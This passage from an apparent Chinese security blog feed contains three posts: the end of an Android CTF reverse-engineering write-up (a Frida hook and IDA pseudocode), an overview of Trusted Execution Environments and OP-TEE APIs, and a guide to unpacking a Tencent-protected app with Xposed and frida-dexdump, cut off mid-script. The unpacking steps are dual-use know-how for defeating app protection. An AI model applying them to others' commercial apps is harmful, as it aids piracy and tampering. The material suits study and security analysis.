class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>因为我们用的虚拟机，非ARM架构，无法加载这个so。。。</p><p>那为啥虚拟机能正常运行app呢？因为模拟了arm去执行吗？不死心，使用下面frida脚本查看加载的so（参考<a href="https://www.cnblogs.com/dxmao/articles/17678351.html">APP使用frida反调试检测绕过 - 树大招疯 - 博客园 (cnblogs.com)</a>）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;android_dlopen_ext&quot;</span>),<br>        &#123;<br>            <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>                <span class="hljs-keyword">var</span> pathptr = args[<span class="hljs-number">0</span>];<br>                <span class="hljs-keyword">if</span> (pathptr !== <span class="hljs-literal">undefined</span> &amp;&amp; pathptr != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">var</span> path = <span class="hljs-title function_">ptr</span>(pathptr).<span class="hljs-title function_">readCString</span>();<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;load &quot;</span> + path);<br>                &#125;<br>            &#125;<br>        &#125;<br>    );<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">frida -U -f com.ctf.test.ctf_100 -l frida_script.js<br></code></pre></td></tr></table></figure><p>结果frida在加载到arm的so文件时就会崩溃。。。下次用真机试试吧</p><p>后面好像没办法继续了，IDA看一下关键函数的逻辑吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">jint <span class="hljs-title function_">JNI_OnLoad</span><span class="hljs-params">(JavaVM *vm, <span class="hljs-type">void</span> *reserved)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// r1</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [sp+0h] [bp-18h] BYREF</span><br>  <span class="hljs-type">int</span> v5[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [sp+4h] [bp-14h] BYREF</span><br><br>  v4 = <span class="hljs-number">0</span>;<br>  v5[<span class="hljs-number">0</span>] = (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;get_flag&quot;</span>;<br>  v5[<span class="hljs-number">1</span>] = (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;(I)Ljava/lang/String;&quot;</span>;<br>  v5[<span class="hljs-number">2</span>] = (<span class="hljs-type">int</span>)sub_F90;<br>  <span class="hljs-keyword">if</span> ( (*vm)-&gt;GetEnv(vm, (<span class="hljs-type">void</span> **)&amp;v4, <span class="hljs-number">65540</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  v3 = (*(<span class="hljs-type">int</span> (__fastcall **)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_DWORD *)v4 + <span class="hljs-number">24</span>))(v4, <span class="hljs-string">&quot;com/ctf/test/ctf_100/MainActivity&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !v3 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  (*(<span class="hljs-type">void</span> (__fastcall **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">int</span> *, <span class="hljs-type">int</span>))(*(_DWORD *)v4 + <span class="hljs-number">860</span>))(v4, v3, v5, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">65540</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>JNI_OnLoad函数中可以看出调用了sub_F90函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_F90</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *v2; <span class="hljs-comment">// r2</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// r3</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// r0</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// r1</span><br>  <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// r5</span><br>  <span class="hljs-type">char</span> *v7; <span class="hljs-comment">// r3</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// r0</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// r1</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// r3</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// r2</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v12; <span class="hljs-comment">// r3</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v13; <span class="hljs-comment">// r0</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v14; <span class="hljs-comment">// r3</span><br>  <span class="hljs-type">char</span> v15; <span class="hljs-comment">// r0</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// r0</span><br>  <span class="hljs-type">char</span> v17; <span class="hljs-comment">// r3</span><br>  <span class="hljs-type">int</span> v19[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [sp+0h] [bp-60h] BYREF</span><br>  <span class="hljs-type">int</span> v20[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [sp+8h] [bp-58h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v21[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [sp+10h] [bp-50h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v22; <span class="hljs-comment">// [sp+18h] [bp-48h] BYREF</span><br>  <span class="hljs-type">char</span> v23[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [sp+20h] [bp-40h] BYREF</span><br>  <span class="hljs-type">char</span> v24[<span class="hljs-number">20</span>]; <span class="hljs-comment">// [sp+30h] [bp-30h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( dword_4004 == <span class="hljs-number">1</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  v2 = v21;<br>  v3 = <span class="hljs-string">&quot;my_test_ctf_flag&quot;</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v4 = *(_DWORD *)v3;<br>    v3 += <span class="hljs-number">8</span>;<br>    v5 = *((_DWORD *)v3 - <span class="hljs-number">1</span>);<br>    *v2 = v4;<br>    v2[<span class="hljs-number">1</span>] = v5;<br>    v2 += <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v3 != <span class="hljs-string">&quot;&quot;</span> );<br>  v6 = v23;<br>  v7 = (<span class="hljs-type">char</span> *)&amp;dword_2801;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v8 = *(_DWORD *)v7;<br>    v7 += <span class="hljs-number">8</span>;<br>    v9 = *((_DWORD *)v7 - <span class="hljs-number">1</span>);<br>    *(_DWORD *)v6 = v8;<br>    *((_DWORD *)v6 + <span class="hljs-number">1</span>) = v9;<br>    v6 += <span class="hljs-number">8</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v7 != <span class="hljs-string">&quot;get_flag&quot;</span> );<br>  sub_F08(v21, (<span class="hljs-type">int</span>)v23, v19);<br>  sub_F08(&amp;v22, (<span class="hljs-type">int</span>)v23, v20);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i != <span class="hljs-number">8</span>; ++i )<br>    *((_BYTE *)v19 + i) ^= *((_BYTE *)v20 + i);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j != <span class="hljs-number">8</span>; ++j )<br>  &#123;<br>    v12 = *((<span class="hljs-type">unsigned</span> __int8 *)v19 + j);<br>    v13 = v12 &gt;&gt; <span class="hljs-number">4</span>;<br>    v14 = v12 &amp; <span class="hljs-number">0xF</span>;<br>    <span class="hljs-keyword">if</span> ( v13 &gt; <span class="hljs-number">9</span> )<br>      v15 = v13 + <span class="hljs-number">55</span>;<br>    <span class="hljs-keyword">else</span><br>      v15 = v13 + <span class="hljs-number">48</span>;<br>    v24[<span class="hljs-number">2</span> * j] = v15;<br>    v16 = <span class="hljs-number">2</span> * j;<br>    <span class="hljs-keyword">if</span> ( v14 &gt; <span class="hljs-number">9</span> )<br>      v17 = v14 + <span class="hljs-number">55</span>;<br>    <span class="hljs-keyword">else</span><br>      v17 = v14 + <span class="hljs-number">48</span>;<br>    v24[v16 + <span class="hljs-number">1</span>] = v17;<br>  &#125;<br>  v24[<span class="hljs-number">16</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> (*(<span class="hljs-type">int</span> (__fastcall **)(<span class="hljs-type">int</span>, <span class="hljs-type">char</span> *))(*(_DWORD *)a1 + <span class="hljs-number">668</span>))(a1, v24);<br>&#125;<br></code></pre></td></tr></table></figure><p>这段逻辑应该是生成最终Flag的逻辑，后面等学习IDA动态调试时再去分析吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android可信执行环境学习</title>
    <link href="/blog/2023/11/27/Android%E5%8F%AF%E4%BF%A1%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E5%AD%A6%E4%B9%A0/"/>
    <url>/blog/2023/11/27/Android%E5%8F%AF%E4%BF%A1%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>TEE的全称Trusted Execution Environment，它是移动设备（智能手机、平板电脑、智能电视）CPU上的一块区域。TEE 为运行在其中的应用程序提供了一个隔离的环境以保护应用程序和数据免受其他软件的攻击。TEE 常用于处理敏感的数据，如密码、密钥、生物识别数据等。前面在阅读安全白皮书时也提到了可信区域（HarmonyOS）&#x2F;安全隔区（IOS）的概念，本质上就是本文介绍的可信执行环境。</strong></p><p><img src="/images/fj73.jpg"></p><span id="more"></span><h2 id="TEE简介"><a href="#TEE简介" class="headerlink" title="TEE简介"></a>TEE简介</h2><h3 id="TEE与REE"><a href="#TEE与REE" class="headerlink" title="TEE与REE"></a>TEE与REE</h3><p>可信执行环境（Trusted Execution Environment，TEE） 是一种具有运算和储存功能，能提供安全性和完整性保护的独立处理环境。其基本思想是：在硬件中为敏感数据单独分配一块隔离的内存，所有敏感数据的计算均在这块内存中进行，并且除了经过授权的接口外，硬件中的其他部分不能访问这块隔离的内存中的信息，以此来实现敏感数据的隐私计算。</p><p>富执行环境 (Rich Execution Environment，REE) 指的是操作系统运行时的环境中，可以运行如 Android、IOS 等通用的操作系统。REE 是一个容易受到攻击的开放环境，如敏感数据的窃取、移动支付盗用等等。而 TEE 是中央处理器上的一个安全区域，能够保证敏感数据在隔离和可信的环境内被处理，从而免受来自 REE 中的软件攻击。此外，与其他的安全执行环境相比，TEE 可以端到端地保护 可信应用(Trusted Application，TA)的完整性和机密性，能够提供更强的处理能力和更大的内存空间。TEE用于敏感数据的安全存储、安全通信、可信UI的绘制、安全的加密策略等，而这些策略的承载者，就是TA。TEE 内部为 REE 中的软件提供了接口，使得 REE 中的软件可以调用 TEE 对数据进行处理，但不会泄露敏感数据。</p><p><img src="/images/tee.png" alt="REE调用TEE的接口进行安全数据处理"></p><h3 id="TEE的定义"><a href="#TEE的定义" class="headerlink" title="TEE的定义"></a>TEE的定义</h3><p>Mohamed Sabt 等人在2015年的文章<a href="https://ieeexplore.ieee.org/abstract/document/7345265">Trusted Execution Environment: What It is, and What It is Not | IEEE Conference Publication | IEEE Xplore</a>中对 TEE 进行了崭新的更一般化的定义，提出了TEE的精确定义，并分析了TEE的核心特性。</p><p>分离内核是 TEE 的基础组件和先决条件，安全要求主要由四个主要安全策略组成：</p><ul><li><em>Data (spatial) separation</em>. 一个分区内的数据不能由其他分区读取或修改；</li><li><em>Sanitization (temporal separation)</em>. 共享资源不能用于将信息泄漏到其他分区；</li><li><em>Control of information flow</em>. 除非明确允许，否则分区之间不能进行通信；</li><li><em>Fault isolation</em>. 一个分区中的安全漏洞不能扩散到其他分区。</li></ul><p>可信执行环境(Trusted Execution Environment, TEE)是一种在分离内核上运行的防篡改处理环境。它保证了执行代码的真实性、运行时状态(如CPU寄存器、内存和敏感I&#x2F;O)的完整性，以及存储在持久性内存上的代码、数据和运行时状态的机密性。能够向第三方提供证明其可信性的远程证明。TEE的内容不是静态的;它可以安全地更新。TEE可以抵抗所有软件攻击，也可以抵抗对系统主存进行的物理攻击。利用后门安全缺陷进行的攻击是不可能的。</p><p><img src="/images/image-20231127200648421.png" alt="An overview of TEE building blocks"></p><h3 id="TEE发展"><a href="#TEE发展" class="headerlink" title="TEE发展"></a>TEE发展</h3><p>TEE 技术最早可以追溯到 2006 年。开放移动终端平台（Open Mobile Terminal Platform ，以下简称 OMTP）)率先提出一个针对移动终端的双系统安全解决方案，即在同一个终端系统下同时部署两个操作系统，其中一个是常规的操作系统，另一个是隔离的安全操作系统。其中，安全操作系统运行在隔离的硬件环境中，专门处理敏感信息以保障其安全性。</p><p>在 OMTP 方案的基础上，ARM 公司提出了一种硬件虚拟化技术 TrustZone 及其相关的硬件实现方案，并于 2008 年第一次发布了 Trustzone 技术白皮书。目前 ARM 是移动端最具影响力的方案供应商，其 TEE 技术也在行业内处于主导地位：高通的骁龙系列，海思麒麟，联发科 ，三星等移动端主流处理器的芯片均基于 ARM 结构，并且它们采用的 TEE 技术也基于 ARM 结构。除此之外，还有一种比较主流的可信执行环境产品是 Intel 公司推出的 SGX(Software Guard Extensions)。</p><p>2010 年 7 月，Global Platform（以下简称 GP）正式提出了 TEE 的概念，并从 2011 年开始起草制定相关的 TEE 规范标准，针对 TEE 系统设计了一系列规范，对应用接口，应用流程，安全存储，身份认证等功能进行了规范化。GP 是跨行业的国际标准组织，致力于制定和发布基于硬件安全的技术标准。GP 组织制定和发布的国际标准被称为 GP 标准。此外 GP 组织还设立了 TEE 检测认证体系，对 TEE 产品进行功能检测并颁发证书，国际上大多数基于 TEE 技术的 Trust OS 都遵循了 GP 的标准规范。</p><p>国内，银联自 2012 年起与产业链合作开始制定包括 TEE 硬件、TEE 操作系统、TEE 基础服务和应用等各个层面的规范标准，并且于 2015 年通过技术管理委员会的审核发布银联 TEEI 规范。2017 年初，人民银行开始制定 TEE 各层面的需求类规范。2020 年 7 月，中国信通院发布联合 20 家单位共同参与制定的标准《基于可信执行环境的数据计算平台 技术要求与测试方法》。</p><h2 id="CA与TA的通信（OP-TEE为例）"><a href="#CA与TA的通信（OP-TEE为例）" class="headerlink" title="CA与TA的通信（OP-TEE为例）"></a>CA与TA的通信（OP-TEE为例）</h2><h3 id="OP-TEE"><a href="#OP-TEE" class="headerlink" title="OP-TEE"></a>OP-TEE</h3><p><a href="https://optee.readthedocs.io/en/latest/general/about.html">About OP-TEE — OP-TEE documentation documentation</a></p><p><a href="https://github.com/OP-TEE/">OP-TEE (github.com)</a></p><p>OP-TEE是一个可信任的执行环境(Trusted Execution Environment, TEE)，它设计与运行在Arm上的非安全Linux内核一起。OP-TEE实现TEE内部核心API v1.3.1，这是公开给受信任应用程序的API，以及TEE客户端API v1.0，这是描述如何与TEE通信的API。这些API定义在GlobalPlatform API规范中。</p><p>OP-TEE 主要设计为依靠 Arm TrustZone 技术作为 底层硬件隔离机制。但是，它的结构是 与任何适合 TEE 概念和目标的隔离技术兼容， 例如作为虚拟机运行或在专用 CPU 上运行。</p><p>OP-TEE的主要设计目标是：</p><blockquote><ul><li><strong>隔离</strong> - TEE 提供与非安全操作系统的隔离，并且 使用 底层硬件支持，</li><li><strong>占地面积小</strong> - TEE 应保持足够小，可以驻留在 在基于 Arm 的系统上发现的合理数量的片上存储器，</li><li><strong>便携性</strong> - TEE 旨在轻松插入不同的 架构和可用的硬件，并且必须支持各种设置，例如 多个客户端操作系统或多个 TEE。</li></ul></blockquote><h3 id="通信交互接口"><a href="#通信交互接口" class="headerlink" title="通信交互接口"></a>通信交互接口</h3><p><img src="/images/tee_ta_ca.jpg" alt="tee_ta_ca"></p><h4 id="CA-API"><a href="#CA-API" class="headerlink" title="CA API"></a>CA API</h4><p>TEE客户端API描述并定义了在富操作环境(REE)中运行的客户端应该如何与TEE通信。为了识别要使用的可信应用程序(TA)，客户端提供一个UUID。所有TA都公开一个或多个函数。这些函数对应于所谓的commandID，也是由客户端发送的。</p><p>原则上，命令按此顺序调用：</p><ul><li>TEEC_InitializeContext：对变量Context进行初始化配置，用来建立CA和TEE的联系，向TEE申请共享内存地址用于存放数据。</li><li>TEEC_OpenSession：建立一个CA和TA间的session，用于CA和UUID指定的TA进行通信，是CA连接TA的起始点。</li><li>TEEC_InvokeCommand：依靠打开的session，将传送命令请求给TA，并将必要的指令执行参数一并发送给TA。</li><li>TEEC_CloseSession：关闭session，关闭CA和TA之间的通道。</li><li>TEEC_FinalizeContext：释放Context，结束CA与TEE的连接。</li></ul><p>在会话建立之后，经常会连续调用几次TEEC_InvokeCommand(…)。</p><h4 id="TA-API"><a href="#TA-API" class="headerlink" title="TA API"></a>TA API</h4><p><a href="https://optee.readthedocs.io/en/latest/building/trusted_applications.html">Trusted Applications — OP-TEE documentation documentation</a></p><ul><li>TA_CreateEntryPoint：为CA建立接入点，使得TA可以被CA调用。</li><li>TA_OpenSessionEntryPoint：建立CA与TA之间的通讯通道，作为CA连接TA的起点。</li><li>TA_InvokeCommandEntryPoint：接收CA传送的指令和参数，并在这TEE侧执行。</li><li>TA_CloseSessionEntryPoint：关闭CA与TA的通讯通道</li><li>TA_DestroyEntryPoint：移除CA的接入点，结束TA的功能。</li></ul><h3 id="安全分析"><a href="#安全分析" class="headerlink" title="安全分析"></a>安全分析</h3><p><a href="https://mp.weixin.qq.com/s/ZheWK5WB5Qa7I9deY9uH7A">【看雪议题分享】深入Android 可信应用漏洞挖掘</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次Android APP脱壳记录</title>
    <link href="/blog/2023/11/25/%E4%B8%80%E6%AC%A1Android-APP%E8%84%B1%E5%A3%B3%E8%AE%B0%E5%BD%95/"/>
    <url>/blog/2023/11/25/%E4%B8%80%E6%AC%A1Android-APP%E8%84%B1%E5%A3%B3%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p><strong>一次针对加壳加固的APP的脱壳简单学习，继续深入学习一下Android应用的分析。</strong></p><p><img src="/images/fj72.jpg"></p><span id="more"></span><h2 id="Jadx初步分析确认壳"><a href="#Jadx初步分析确认壳" class="headerlink" title="Jadx初步分析确认壳"></a>Jadx初步分析确认壳</h2><p>最开始使用一些ApkScan-PKID之类的查壳工具没有检测出壳（后来用Xposed后使用MT管理器也正确检查到了壳），于是就使用Jadx手动看一下情况。</p><h3 id="Jadx简介"><a href="#Jadx简介" class="headerlink" title="Jadx简介"></a>Jadx简介</h3><p>Jadx仓库Github地址：<a href="https://github.com/skylot/jadx">skylot&#x2F;jadx: Dex to Java decompiler (github.com)</a></p><p>jadx - Dex 到 Java 反编译器，用于从 Android Dex 和 Apk 文件生成 Java 源代码的命令行和 GUI 工具</p><p>从release中下载最新的压缩包：<a href="https://github.com/skylot/jadx/releases">Releases · skylot&#x2F;jadx (github.com)</a></p><p>解压后打开&#x2F;bin&#x2F;目录，可以看到下面的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop/jadx/bin]<br>└─$ ll<br>total 40<br>-rwxr-xr-x 1 kali kali  9698 Apr 20  2023 jadx<br>-rwxr-xr-x 1 kali kali  4115 Apr 20  2023 jadx.bat<br>-rwxr-xr-x 1 kali kali 10419 Apr 20  2023 jadx-gui<br>-rwxr-xr-x 1 kali kali  4871 Apr 20  2023 jadx-gui.bat<br></code></pre></td></tr></table></figure><p>.bat批处理文件是Windows平台运行的，Linux可以使用<code>./jadx</code>运行命令行版本或者<code>./jadx-gui</code>运行gui版本，运行gui版本会展示如下界面：</p><p><img src="/images/image-20231125171315509.png" alt="jadx-gui"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们将待分析的app拖进去就可以。可以看到代码很少，只有一个入口包装代理应用，初步怀疑加壳保护：</p><p><img src="/images/image-20231125171611523.png"></p><p>打开Resource发现里面有一个tencent_stub文件，搜索一下就发现了完全符合腾讯御安全加固的特征，入口类的load的文件目录等也都符合。</p><h2 id="Xposed-反射大师脱壳"><a href="#Xposed-反射大师脱壳" class="headerlink" title="Xposed+反射大师脱壳"></a>Xposed+反射大师脱壳</h2><p>利用xposed，将loadClass方法劫持住，每当loadClass方法调用完成后，用xposed执行后置方法。获取方法加载的class对象，然后调用getDex方法。拿到对应的dex文件引用，最后将dex文件序列成byte数据，写到自定义保存文件里面去。就能拿到脱壳后的dex文件。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>安装Xposed的app链接:<a href="https://pan.baidu.com/s/13f_xXnFRSvT-yotaxL7Igg">https://pan.baidu.com/s/13f_xXnFRSvT-yotaxL7Igg</a> 提取码: kthq</p><p>也可以使用夜神安卓模拟器 Android 5中的应用商店直接搜索Xposed安装即可，安装过程详见：<a href="https://support.yeshen.com/zh-CN/qt/xp">夜神模拟器如何安装xposed框架 | 夜神模拟器帮助中心 (yeshen.com)</a></p><p>反射大师下载地址：<a href="https://pan.baidu.com/s/1ALN5n9rsfrV1lqWgaXXY2A">https://pan.baidu.com/s/1ALN5n9rsfrV1lqWgaXXY2A</a> 提取码：h5nc</p><p>下载之后直接拖到模拟器安装，然后打开Xposed选择该模块，然后按照提示重启即可。</p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>打开反射大师，选择需要脱壳的APP：</p><p><img src="/images/image-20231125193724288.png"></p><p><img src="/images/image-20231125193800926.png"></p><p>然后打开需要调试的程序，点击红色的芒星：</p><p><img src="/images/image-20231125193926306.png"></p><p>点击写出DEX，然后确定即可：</p><p><img src="/images/image-20231125194021359.png"></p><p>随后使用文件查看器在目录<code>/storage/emulated/0/</code>下即可看到导出的classes.dex文件。</p><p>随后使用adb或者直接使用夜神模拟器的文件共享将classes文件导出即可。</p><p><a href="https://support.yeshen.com/zh-CN/often/wjhc">模拟器与电脑文件如何互传？ | 夜神模拟器帮助中心 (yeshen.com)</a></p><h2 id="frida-dexdump脱壳"><a href="#frida-dexdump脱壳" class="headerlink" title="frida-dexdump脱壳"></a>frida-dexdump脱壳</h2><p>2023.12.28更新</p><p>安装：<a href="https://github.com/hluwa/FRIDA-DEXDump">hluwa&#x2F;frida-dexdump: A frida tool to dump dex in memory to support security engineers analyzing malware. (github.com)</a></p><p>frida的配置详见：<a href="https://chujian521.github.io/blog/2023/12/01/%E5%8A%A8%E6%80%81%E9%92%A9%E5%AD%90%E5%B7%A5%E5%85%B7Frida%E7%9A%84%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/">动态钩子工具Frida的入门学习 </a></p><p>开启frida-server之后，打开待脱壳的应用，使用<code>frida-ps -U</code>或者<code>frida-ps -U -a</code>查看app的文件描述符，然后使用<code>frida-dexdump -U -f com.xxx.xxxx</code>即可进行内存查找dex文件脱壳，脱壳后有多个dex文件，可以使用下面脚本简单打包一下方便放入jadx分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> argparse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rename_class</span>(<span class="hljs-params">path</span>):<br>    files = os.listdir(path)<br>    dex_index = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> path.endswith(<span class="hljs-string">&#x27;/&#x27;</span>):<br>        path = path[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(path)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(files)):<br>        <span class="hljs-keyword">if</span> files[i].endswith(<span class="hljs-string">&#x27;.dex&#x27;</span>):<br>            old_name = path + <span class="hljs-string">&#x27;/&#x27;</span> + files[i]<br>            <span class="hljs-keyword">if</span> dex_index == <span class="hljs-number">0</span>:<br>                new_name = path + <span class="hljs-string">&#x27;/&#x27;</span> + <span class="hljs-string">&#x27;classes.dex&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                new_name = path + <span class="hljs-string">&#x27;/&#x27;</span> + <span class="hljs-string">&#x27;classes%d.dex&#x27;</span> % dex_index<br>            dex_index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> os.path.exists(new_name):<br>                <span class="hljs-keyword">continue</span><br>            os.rename(old_name, new_name)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] 重命名完毕&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_META_INF_from_apk</span>(<span class="hljs-params">apk_path, target_path</span>):<br>    r = zipfile.is_zipfile(apk_path)<br>    <span class="hljs-keyword">if</span> r:<br>        fz = zipfile.ZipFile(apk_path, <span class="hljs-string">&#x27;r&#x27;</span>)<br>        <span class="hljs-keyword">for</span> file <span 